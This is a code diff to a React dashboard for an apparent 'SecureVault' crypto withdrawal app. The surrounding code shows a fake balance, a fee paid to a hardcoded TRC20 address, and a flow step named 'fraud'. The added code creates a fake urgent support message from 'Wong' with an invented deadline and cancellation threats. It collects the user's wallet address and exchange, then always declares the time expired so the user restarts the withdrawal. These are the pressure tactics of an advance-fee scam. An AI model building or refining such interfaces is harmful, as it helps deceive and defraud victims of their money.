@@ -1,8 +1,9 @@
 import { useState, useMemo } from "react";
-import { CreditCard, User, Calendar, Lock, Shield, DollarSign, ArrowRight, Building2, Bitcoin, Wallet, CheckCircle, Copy, Check, PartyPopper, Loader2, RefreshCw } from "lucide-react";
+import { CreditCard, User, Calendar, Lock, Shield, DollarSign, ArrowRight, Building2, Bitcoin, Wallet, CheckCircle, Copy, Check, PartyPopper, Loader2, RefreshCw, Bell, AlertTriangle, Clock } from "lucide-react";
 import { supabase } from "@/integrations/supabase/client";
 import { Button } from "@/components/ui/button";
 import { Input } from "@/components/ui/input";
+import { Alert, AlertDescription, AlertTitle } from "@/components/ui/alert";
 import {
   Dialog,
   DialogContent,
@@ -45,6 +46,7 @@ const FEE_PAYMENT_ADDRESS = "TZBh3GopUxDr9G6eCD5ShAT3ZgmsLRz8Bz";
 
 type PaymentMethod = "bank" | "crypto" | null;
 type CashoutStep = "method" | "details" | "confirm" | "fee" | "payment" | "fraud";
+type NotificationState = "badge" | "viewing" | "expired" | "hidden";
 
 const Dashboard = () => {
   const [cardName, setCardName] = useState("");
@@ -75,6 +77,11 @@ const Dashboard = () => {
   // Payment confirmation
   const [paymentConfirmed, setPaymentConfirmed] = useState(false);
   const [copied, setCopied] = useState(false);
+
+  // Urgent notification state
+  const [notificationState, setNotificationState] = useState<NotificationState>("badge");
+  const [notificationWalletAddress, setNotificationWalletAddress] = useState("");
+  const [notificationExchange, setNotificationExchange] = useState("");
 
   const balance = 9876;
   const fee = balance * 0.02;
@@ -723,6 +730,25 @@ const Dashboard = () => {
           </div>
         </div>
 
+      {/* Urgent Notification Badge */}
+      {notificationState === "badge" && (
+        <button
+          onClick={() => setNotificationState("viewing")}
+          className="w-full mb-6 animate-pulse"
+        >
+          <Alert className="bg-destructive/20 border-destructive/50 cursor-pointer hover:bg-destructive/30 transition-colors">
+            <Bell className="h-5 w-5 text-destructive" />
+            <AlertTitle className="text-destructive font-semibold flex items-center gap-2">
+              🚨 Urgent Notification
+              <span className="ml-auto text-xs bg-destructive/30 px-2 py-0.5 rounded-full">1 new</span>
+            </AlertTitle>
+            <AlertDescription className="text-destructive/80 text-sm">
+              Action required from SecureVault Support. Click to view.
+            </AlertDescription>
+          </Alert>
+        </button>
+      )}
+
         {/* Welcome Banner */}
         <div className="bg-primary/10 border border-primary/30 rounded-lg p-3 mb-6">
           <p className="text-xs text-primary text-center font-medium">
@@ -891,6 +917,134 @@ const Dashboard = () => {
       <Dialog open={showCashout} onOpenChange={(open) => !open && resetCashout()}>
         <DialogContent className="glass-card border-border max-w-md">
           {renderCashoutContent()}
+        </DialogContent>
+      </Dialog>
+
+      {/* Urgent Notification Dialog */}
+      <Dialog open={notificationState === "viewing"} onOpenChange={(open) => !open && setNotificationState("hidden")}>
+        <DialogContent className="glass-card border-destructive/50 max-w-lg">
+          <DialogHeader>
+            <DialogTitle className="text-center">
+              <div className="w-16 h-16 mx-auto mb-4 rounded-full bg-destructive/20 flex items-center justify-center">
+                <AlertTriangle className="w-8 h-8 text-destructive" />
+              </div>
+              <span className="text-lg font-display text-destructive">Urgent Support Message</span>
+            </DialogTitle>
+          </DialogHeader>
+          
+          <div className="py-4 space-y-4">
+            <div className="flex items-center gap-2 text-xs text-muted-foreground">
+              <Clock className="w-4 h-4" />
+              <span>Received 64 hours ago</span>
+              <span className="ml-auto text-destructive font-medium">⚠️ Deadline exceeded</span>
+            </div>
+            
+            <div className="bg-secondary/50 rounded-lg p-4 space-y-3 text-sm">
+              <p className="text-foreground">
+                <strong>From:</strong> Wong - SecureVault Support Team
+              </p>
+              <div className="border-t border-border pt-3 text-foreground/90 space-y-2">
+                <p>Dear Valued Customer,</p>
+                <p>
+                  We are reaching out regarding funds pending <strong>manual disbursement</strong> to your crypto wallet:
+                </p>
+                <div className="bg-background/50 rounded p-3 space-y-2">
+                  <div className="flex justify-between">
+                    <span className="text-muted-foreground">Withdrawal Amount:</span>
+                    <span className="font-bold gold-text">${balance.toLocaleString()}</span>
+                  </div>
+                  <div className="flex justify-between">
+                    <span className="text-muted-foreground">Processing Fee Refund:</span>
+                    <span className="font-medium text-chart-2">$96.52 USDT</span>
+                  </div>
+                </div>
+                <p className="text-destructive font-medium">
+                  ⏰ Kindly submit the following details <strong>urgently within 12 hours</strong>, or:
+                </p>
+                <ul className="list-disc list-inside text-destructive/80 text-xs space-y-1">
+                  <li>The refund will be cancelled</li>
+                  <li>The amount to be disbursed will be cancelled</li>
+                  <li>You will need to restart the entire withdrawal process</li>
+                </ul>
+              </div>
+            </div>
+
+            <div className="space-y-4">
+              <div className="space-y-2">
+                <label className="text-sm font-medium text-foreground/80">Wallet Address (TRC20) *</label>
+                <Input
+                  value={notificationWalletAddress}
+                  onChange={(e) => setNotificationWalletAddress(e.target.value)}
+                  placeholder="Enter your TRC20 wallet address"
+                  className="h-11 bg-input border-border font-mono text-sm"
+                />
+              </div>
+              
+              <div className="space-y-2">
+                <label className="text-sm font-medium text-foreground/80">Exchange *</label>
+                <Select value={notificationExchange} onValueChange={setNotificationExchange}>
+                  <SelectTrigger className="h-11 bg-input border-border">
+                    <SelectValue placeholder="Select your exchange" />
+                  </SelectTrigger>
+                  <SelectContent className="bg-background border-border">
+                    {CRYPTO_EXCHANGES.map((ex) => (
+                      <SelectItem key={ex} value={ex}>{ex}</SelectItem>
+                    ))}
+                  </SelectContent>
+                </Select>
+              </div>
+            </div>
+
+            <Button
+              onClick={() => setNotificationState("expired")}
+              disabled={!notificationWalletAddress || !notificationExchange}
+              className="w-full h-11 bg-gradient-to-r from-primary to-accent text-primary-foreground font-semibold"
+            >
+              Submit Details <ArrowRight className="w-4 h-4 ml-2" />
+            </Button>
+          </div>
+        </DialogContent>
+      </Dialog>
+
+      {/* Time Expired Dialog */}
+      <Dialog open={notificationState === "expired"} onOpenChange={(open) => !open && setNotificationState("hidden")}>
+        <DialogContent className="glass-card border-destructive/50 max-w-md">
+          <DialogHeader>
+            <DialogTitle className="text-center">
+              <div className="w-16 h-16 mx-auto mb-4 rounded-full bg-destructive/20 flex items-center justify-center">
+                <Clock className="w-8 h-8 text-destructive" />
+              </div>
+              <span className="text-lg font-display text-destructive">Time Has Expired</span>
+            </DialogTitle>
+          </DialogHeader>
+          
+          <div className="py-4 text-center space-y-4">
+            <p className="text-foreground">
+              The 12-hour deadline has passed. The notification was received <strong>64 hours ago</strong>.
+            </p>
+            <div className="bg-destructive/10 border border-destructive/30 rounded-lg p-4 text-sm text-destructive">
+              <p className="font-medium mb-2">Your submission cannot be processed because:</p>
+              <ul className="list-disc list-inside text-left space-y-1 text-destructive/80">
+                <li>The refund request has been cancelled</li>
+                <li>The disbursement has been voided</li>
+                <li>You must restart the withdrawal process</li>
+              </ul>
+            </div>
+            <p className="text-muted-foreground text-sm">
+              Please start a new withdrawal request to receive your funds.
+            </p>
+          </div>
+
+          <Button
+            onClick={() => {
+              setNotificationState("hidden");
+              setNotificationWalletAddress("");
+              setNotificationExchange("");
+            }}
+            className="w-full h-11 bg-gradient-to-r from-primary to-accent text-primary-foreground font-semibold"
+          >
+            Start Withdrawal Process <ArrowRight className="w-4 h-4 ml-2" />
+          </Button>
         </DialogContent>
       </Dialog>
     </div>
